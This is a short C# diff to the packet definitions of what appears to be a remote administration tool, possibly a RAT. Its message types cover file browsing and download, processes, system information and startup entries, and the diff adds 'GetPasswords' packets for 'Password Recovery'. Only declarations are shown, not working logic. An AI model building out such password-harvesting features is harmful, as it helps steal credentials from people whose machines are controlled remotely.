@@ -15,7 +15,8 @@ namespace Serveur.Packets
         GetDrives, GetDrivesResponse, SetStatusFileManager, GetDirectory, GetDirectoryResponse, DoDownloadFile, DoDownloadFileResponse, DoDownloadFileCancel, // File Manager
         GetProcesses, GetProcessesResponse, // Task Manager
         GetSysInfo, GetSysInfoResponse, // System Information
-        GetStartupItems, GetStartupItemsResponse, DoStartupItemAdd, DoStartupItemRemove // Startup Manager
+        GetStartupItems, GetStartupItemsResponse, DoStartupItemAdd, DoStartupItemRemove, // Startup Manager
+        GetPasswords, GetPasswordsResponse // Password Recovery
     }
 
     [Union(typeof(SetStatus), // Set Status
@@ -27,7 +28,8 @@ namespace Serveur.Packets
         typeof(GetDrives), typeof(GetDrivesResponse), typeof(SetStatusFileManager), typeof(GetDirectory), typeof(GetDirectoryResponse), typeof(DoDownloadFile), typeof(DoDownloadFileResponse), typeof(DoDownloadFileCancel), // File Manager
         typeof(GetProcesses), typeof(GetProcessesResponse), // Task Manager
         typeof(GetSysInfo), typeof(GetSysInfoResponse), // System Information
-        typeof(GetStartupItems), typeof(GetStartupItemsResponse), typeof(DoStartupItemAdd), typeof(DoStartupItemRemove))] // Startup Manager
+        typeof(GetStartupItems), typeof(GetStartupItemsResponse), typeof(DoStartupItemAdd), typeof(DoStartupItemRemove), // Startup Manager
+        typeof(GetPasswords), typeof(GetPasswordsResponse))] // Password Recovery
 
     public abstract class IPackets
     {
